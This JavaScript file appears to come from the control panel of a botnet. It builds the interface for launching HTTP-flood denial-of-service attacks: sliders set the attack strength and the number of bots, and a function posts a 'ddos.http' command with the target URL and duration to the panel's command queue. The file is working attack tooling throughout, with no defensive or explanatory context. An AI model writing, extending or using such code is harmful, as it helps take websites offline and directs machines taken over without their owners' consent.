var httpfloodbotsmouseState=0;
var httpfloodstrengthmouseState=0;

function httpfloodstrength_Slider(event){
	var x;if (event.layerX) {x = event.layerX - 2;} else {x = event.x - 2;}if(Math.round((x / 96) * 100) > 100 || Math.round((x / 96) * 100) < 1) {return;}
	$("#HTTPFlood_Strength_InnerSlider").css("width", x + "px");
	$("#HTTPFlood_Strength").val((Math.round(((x / 96) * 100))) + "%");
}
function httpfloodstrength_SliderBegin(event){httpfloodstrengthmouseState=1;}
function httpfloodstrength_SliderMove(event) {if (httpfloodstrengthmouseState == 1) {httpfloodstrength_Slider(event);}}
function httpfloodstrength_SliderEnd(event) {httpfloodstrengthmouseState=0;}

function httpfloodbots_Slider(event){
	var x;if (event.layerX) {x = event.layerX - 2;} else {x = event.x - 2;}if(Math.round((x / 96) * 100) > 100 || Math.round((x / 96) * 100) < 1) {return;}
	$("#HTTPFlood_Bots_InnerSlider").css("width", x + "px");
	$("#HTTPFlood_Bots").val(Math.round(((x / 96) * totalbots)));
}
function httpfloodbots_SliderBegin(event){httpfloodbotsmouseState=1;}
function httpfloodbots_SliderMove(event) {if (httpfloodbotsmouseState == 1) {httpfloodbots_Slider(event);}}
function httpfloodbots_SliderEnd(event) {httpfloodbotsmouseState=0;}

function processHTTPFlood(obj) {
	var poststring = '';
	var commandstring = 'ddos.http ';
	commandstring += escape($("#HTTPFlood_TargetURL").val());
	commandstring += " " + Math.round(1000 - ((parseInt($("#HTTPFlood_Strength").val().replace("%", ""), 10) / 100) * 1000)) + " " + $("#HTTPFlood_Duration").val();
	poststring="&submit=1&command=" + escape(commandstring) + "&commandquota=" + $("#HTTPFlood_Bots").val();
	$("#desktop-window-httpflood-content").html("Loading...");
	$.ajax({
		async: true,
		url: "index.php?p=IssueCommand",
		type: "POST",
		data: poststring,
		success: function(data){
			$("#desktop-window-httpflood-content").html("Successfully added command to Task Queue.<br /><br />" +
			"<a href=\"javascript:void(0)\" onclick=\"HTTPFlood_Reload()\">Click here</a> to add another ddos attack.");
		}
	});
	return false;
}
function HTTPFlood_Reload() {
	showWindow('httpflood');
}
